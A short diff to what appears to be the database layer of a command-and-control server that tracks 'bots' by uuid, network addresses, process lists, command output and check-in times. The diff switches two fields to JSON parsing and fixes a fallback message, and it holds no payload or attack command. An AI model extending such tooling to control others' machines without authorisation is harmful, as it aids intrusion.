@@ -1,5 +1,6 @@
 import os
 import time
+import json
 import hashlib
 import sqlite3 as sql
 from datetime import datetime
@@ -80,7 +81,8 @@ def bot_nwaddrtostring(conn:sql.Connection, id):
     cur.execute('''SELECT networkaddresses FROM bots WHERE uuid=?''', (id,))
     data = cur.fetchone()
     if data:
-        return data[0].upper().split(",")
+        json_data = json.loads(data[0])
+        return json_data
     else:
         return "No network address data"
 
@@ -96,10 +98,11 @@ def bot_pstostring(conn:sql.Connection, id):
     cur.execute('''SELECT processlist FROM bots WHERE uuid=?''', (id,))
     data = cur.fetchone()
     print(data)
-    if data[0] and "&" in data[0]:
-        return data[0].split("&")
+    if data[0]:
+        json_data = json.loads(data[0])
+        return json_data
     else:
-        return "No network address data"
+        return "No process data"
 
 
 def bot_cmdouttostring(conn: sql.Connection, id):
@@ -193,8 +196,6 @@ def get_all_bot_ids_and_networking(conn: sql.Connection):
     cur.execute('SELECT uuid, networkaddresses FROM bots ORDER BY checkin DESC')
     return_val = cur.fetchall()
     return return_val
-
-
 
 def get_bot_count(conn: sql.Connection):
     cur = conn.cursor()
